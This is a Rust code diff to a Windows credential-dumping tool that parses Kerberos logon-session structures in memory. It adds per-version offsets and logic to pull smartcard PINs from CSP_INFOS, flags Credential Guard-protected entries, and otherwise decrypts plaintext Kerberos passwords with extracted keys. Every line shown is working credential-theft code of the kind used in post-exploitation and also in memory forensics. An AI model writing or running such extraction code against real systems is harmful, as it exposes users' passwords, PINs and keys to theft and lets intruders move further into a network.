@@ -21,6 +21,10 @@ struct KerbOffsets {
     tickets_1: u64, // TGT
     tickets_2: u64, // TGS
     tickets_3: u64, // Client
+    /// Pointer to SmartcardInfos (CSP_INFOS) — last field after Tickets_3's
+    /// LIST_ENTRY (16 bytes) + FILETIME (8 bytes). Only meaningful for x64
+    /// Win10 1607+ variants; 0 means not available.
+    smartcard_infos: u64,
 }
 
 /// Kerberos key hash entry offsets per Windows version.
@@ -73,6 +77,7 @@ const KERB_OFFSET_VARIANTS: &[KerbOffsets] = &[
         tickets_1: 0x128,
         tickets_2: 0x140,
         tickets_3: 0x158,
+        smartcard_infos: 0x158 + 0x18, // tickets_3 + LIST_ENTRY(16) + FILETIME(8)
     },
     // Win11 24H2+: KIWI_KERBEROS_LOGON_SESSION_10_1607 without unk13 PVOID
     // All offsets shift -0x10 from variant 0 (unk13 removed, unk1 changed from PVOID to ULONG)
@@ -84,6 +89,7 @@ const KERB_OFFSET_VARIANTS: &[KerbOffsets] = &[
         tickets_1: 0x118,
         tickets_2: 0x130,
         tickets_3: 0x148,
+        smartcard_infos: 0x148 + 0x18, // tickets_3 + LIST_ENTRY(16) + FILETIME(8)
     },
     // Win10 1507-1511: KIWI_KERBEROS_LOGON_SESSION_10
     KerbOffsets {
@@ -94,6 +100,7 @@ const KERB_OFFSET_VARIANTS: &[KerbOffsets] = &[
         tickets_1: 0x118,
         tickets_2: 0x130,
         tickets_3: 0x148,
+        smartcard_infos: 0, // not available on pre-1607
     },
     // Win8/8.1: KIWI_KERBEROS_LOGON_SESSION (session_10 variant)
     KerbOffsets {
@@ -104,6 +111,7 @@ const KERB_OFFSET_VARIANTS: &[KerbOffsets] = &[
         tickets_1: 0xE8,
         tickets_2: 0x100,
         tickets_3: 0x118,
+        smartcard_infos: 0, // not available
     },
     // Win7: KIWI_KERBEROS_LOGON_SESSION
     KerbOffsets {
@@ -114,6 +122,7 @@ const KERB_OFFSET_VARIANTS: &[KerbOffsets] = &[
         tickets_1: 0xA0,
         tickets_2: 0xB8,
         tickets_3: 0xD0,
+        smartcard_infos: 0, // not available
     },
 ];
 
@@ -193,6 +202,7 @@ const KERB_OFFSET_VARIANTS_X86: &[KerbOffsets] = &[
         tickets_1: 0x94,
         tickets_2: 0xA0,
         tickets_3: 0xAC,
+        smartcard_infos: 0, // not handled on x86
     },
     // Win10 1507-1511 x86
     KerbOffsets {
@@ -203,6 +213,7 @@ const KERB_OFFSET_VARIANTS_X86: &[KerbOffsets] = &[
         tickets_1: 0x8C,
         tickets_2: 0x98,
         tickets_3: 0xA4,
+        smartcard_infos: 0, // not handled on x86
     },
 ];
 
@@ -379,19 +390,65 @@ fn extract_kerberos_credentials(
         }
 
         let password = if !username.is_empty() {
-            match extract_kerb_password(vmem, cred_addr, offsets.cred_password, keys) {
-                Ok(p) => p,
-                Err(e) => {
-                    log::debug!(
-                        "Kerberos password extraction failed for luid=0x{:x}: {}",
-                        luid,
-                        e
+            // Win10 1607+ (variant 0 and 1): check the credential type field at
+            // credentials + 0x28 to detect Credential Guard ISO-encrypted passwords.
+            // type == 1 → ISO blob (cannot decrypt), type == 0 or 2 → normal password.
+            let is_iso = if variant_idx <= 1 {
+                let cred_type = vmem.read_virt_u32(cred_addr + 0x28).unwrap_or(0);
+                if cred_type == 1 {
+                    log::info!(
+                        "Kerberos: LUID=0x{:x} user={} has ISO-encrypted credential (Credential Guard)",
+                        luid, username
                     );
-                    String::new()
+                    true
+                } else {
+                    false
+                }
+            } else {
+                false
+            };
+
+            if is_iso {
+                "(Credential Guard ISO)".to_string()
+            } else {
+                match extract_kerb_password(vmem, cred_addr, offsets.cred_password, keys) {
+                    Ok(p) => p,
+                    Err(e) => {
+                        log::debug!(
+                            "Kerberos password extraction failed for luid=0x{:x}: {}",
+                            luid,
+                            e
+                        );
+                        String::new()
+                    }
                 }
             }
         } else {
             String::new()
+        };
+
+        // SmartCard PIN extraction: if password is empty, try reading the PIN
+        // from SmartcardInfos (CSP_INFOS). The PIN is a UNICODE_STRING at +0x00
+        // of the CSP_INFOS structure pointed to by the SmartcardInfos pointer.
+        let password = if password.is_empty() && offsets.smartcard_infos != 0 {
+            let sc_ptr = vmem.read_virt_u64(entry + offsets.smartcard_infos).unwrap_or(0);
+            if sc_ptr > 0x10000 && (sc_ptr >> 48) == 0 {
+                // CSP_INFOS starts with LSA_UNICODE_STRING PinCode at +0x00
+                match extract_kerb_password(vmem, sc_ptr, 0, keys) {
+                    Ok(pin) if !pin.is_empty() => {
+                        log::info!(
+                            "Kerberos: LUID=0x{:x} user={} SmartCard PIN extracted",
+                            luid, username
+                        );
+                        format!("[PIN] {}", pin)
+                    }
+                    _ => password,
+                }
+            } else {
+                password
+            }
+        } else {
+            password
         };
 
         // Extract encryption keys (AES128, AES256, RC4, DES) from pKeyList
